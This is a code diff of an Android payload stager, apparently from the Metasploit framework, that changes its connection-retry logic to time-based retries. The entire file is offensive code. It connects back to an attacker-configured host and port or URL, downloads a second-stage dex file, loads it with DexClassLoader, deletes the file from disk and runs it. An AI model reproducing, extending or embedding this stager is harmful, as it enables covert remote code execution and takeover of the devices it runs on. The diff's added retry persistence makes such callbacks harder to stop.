@@ -12,6 +12,7 @@ import java.net.Socket;
 import java.net.URL;
 import java.net.URLConnection;
 import java.util.Random;
+import java.util.concurrent.TimeUnit;
 
 import javax.net.ssl.HttpsURLConnection;
 
@@ -19,18 +20,21 @@ import dalvik.system.DexClassLoader;
 
 public class Payload {
 
-    public static final String LHOST =  "XXXX127.0.0.1                       ";
-    public static final String LPORT =  "YYYY4444                            ";
-    public static final String URL =    "ZZZZ                                ";
-    public static final String TRIALS = "TTTT                                ";
+    public static final String LHOST =  		"XXXX127.0.0.1                       ";
+    public static final String LPORT =  		"YYYY4444                            ";
+    public static final String URL =    		"ZZZZ                                ";
+    public static final String RETRY_TOTAL = 	"TTTT                                ";
+    public static final String RETRY_WAIT = 	"SSSS                                ";
 
 	private static final int URI_CHECKSUM_INITJ = 88;
 	private static final String AB = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
     private static final Random rnd = new Random();
 
     private static String[] parameters;
+	private static int retryTotal;
+	private static int retryWait;
 
-    public static void start(Context context) {
+	public static void start(Context context) {
         startInPath(context.getFilesDir().toString());
     }
 
@@ -55,26 +59,35 @@ public class Payload {
             String path = currentDir.getAbsolutePath();
             parameters = new String[] { path };
         }
-		int nTrials = Integer.parseInt(TRIALS.substring(4).trim());
-		while (!startReverseConn() && nTrials-- > 0) {
+		try {
+			retryTotal = Integer.parseInt(RETRY_TOTAL.substring(4).trim());
+			retryWait = Integer.parseInt(RETRY_WAIT.substring(4).trim());
+		} catch (NumberFormatException e) {
+			return;
+		}
+
+        long retryEnd = System.currentTimeMillis() + TimeUnit.SECONDS.toMillis(retryTotal);
+		long retryDelay = TimeUnit.SECONDS.toMillis(retryWait);
+
+		while (retryEnd > System.currentTimeMillis()) {
+			startReverseConn();
 			try {
-				Thread.sleep(60000);
+				Thread.sleep(retryDelay);
 			} catch (InterruptedException e) {
+				return;
 			}
 		}
 	}
 
-	private static boolean startReverseConn() {
+	private static void startReverseConn() {
 		try {
 			if (URL.substring(4).trim().length() == 0) {
                 reverseTCP();
             } else {
                 reverseHTTP();
             }
-
-			return true;
 		} catch (Exception e) {
-			return false;
+			e.printStackTrace();
 		}
 	}
 
@@ -115,7 +128,7 @@ public class Payload {
 			urlConn = (HttpsURLConnection) url.openConnection();
 			Class.forName("com.metasploit.stage.PayloadTrustManager")
 					.getMethod("useFor", new Class[] { URLConnection.class })
-					.invoke(null, new Object[] { urlConn });
+					.invoke(null, urlConn);
 		} else {
             urlConn = (HttpURLConnection) url.openConnection();
         }
@@ -129,18 +142,13 @@ public class Payload {
 		urlConn.disconnect();
 	}
 
-	private static void reverseTCP() {
-		try {
-			String lhost = LHOST.substring(4).trim();
-			String lport = LPORT.substring(4).trim();
-			Socket msgsock = new Socket(lhost, Integer.parseInt(lport));
-			DataInputStream in = new DataInputStream(msgsock.getInputStream());
-			OutputStream out = new DataOutputStream(msgsock.getOutputStream());
-			loadStage(in, out, parameters);
-
-		} catch (Exception e) {
-			e.printStackTrace();
-		}
+	private static void reverseTCP() throws Exception {
+		String lhost = LHOST.substring(4).trim();
+		String lport = LPORT.substring(4).trim();
+		Socket msgsock = new Socket(lhost, Integer.parseInt(lport));
+		DataInputStream in = new DataInputStream(msgsock.getInputStream());
+		OutputStream out = new DataOutputStream(msgsock.getOutputStream());
+		loadStage(in, out, parameters);
 	}
 
 	private static void loadStage(DataInputStream in, OutputStream out, String[] parameters) throws Exception {
@@ -176,9 +184,8 @@ public class Payload {
 		final Object stage = myClass.newInstance();
 		file.delete();
 		new File(dexPath).delete();
-		myClass.getMethod(
-				"start",
-				new Class[] { DataInputStream.class, OutputStream.class, String[].class }).invoke(stage,
-				new Object[] { in, out, parameters });
+		myClass.getMethod("start",
+				new Class[] { DataInputStream.class, OutputStream.class, String[].class })
+				.invoke(stage, in, out, parameters);
 	}
 }
